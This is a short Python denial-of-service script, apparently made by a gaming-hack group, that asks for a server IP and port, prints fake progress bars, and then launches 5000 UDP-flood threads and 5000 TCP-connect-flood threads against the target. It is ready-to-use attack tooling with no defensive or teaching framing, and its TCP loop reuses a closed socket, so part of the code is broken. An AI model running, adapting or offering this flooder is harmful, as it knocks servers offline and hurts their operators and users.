import time
import os
import socket
import threading

def udpflood(ip, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  raw = os.urandom(1024)
  payload = b'\xfe' + raw
  while True:
    s.sendto(payload, (ip, port))

def tcpflood(ip, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  raw = os.urandom(1024)
  while True:
    s.connect((ip, port))
    s.send(raw)
    time.sleep(0)
    s.close()
os.system("clear")
print("MuxTeamH4CK x ATTACK")
print("\033[1;34m")
print("Teams: EnderBob x ItzMuxGamer")
print(" ")
time.sleep(0)
ip = input("Server IP: ")
port = int(input("Server Port: "))
time.sleep(0)
os.system("clear")
print("|=====================|")
print("|Connecting To Server |")
print("|=====================|")
time.sleep(2)
print("|Loading: 9%          |")
time.sleep(2)
print("|Loading: 26%         |")
time.sleep(2)
print("|Loading: 69%         |")
time.sleep(2)
print("|Loading: 100%        |")
time.sleep(2)
print("|=====================|")
time.sleep(2)
print("|Server has Connected |")
print("|=====================|")
time.sleep(2)
print(" ")
print("Successfully ATTACK SENT TO SERVER!")
print(" ")
print("\033[31m=============================")
print(f"|\033[31mServer IP: {ip}       ")
print(f"|\033[31mServer Port: {port}   ")
print("|Stopped ATTACK: CTRL + Z          ")
print("\033[31m=============================")

for i in range(5000):
  t = threading.Thread(target=udpflood,args=(ip, port), daemon=True)
  t.start()
for i in range(5000):
  t2 = threading.Thread(target=tcpflood,args=(ip, port), daemon=True)
  t2.start()

while True:
  time.sleep(0)
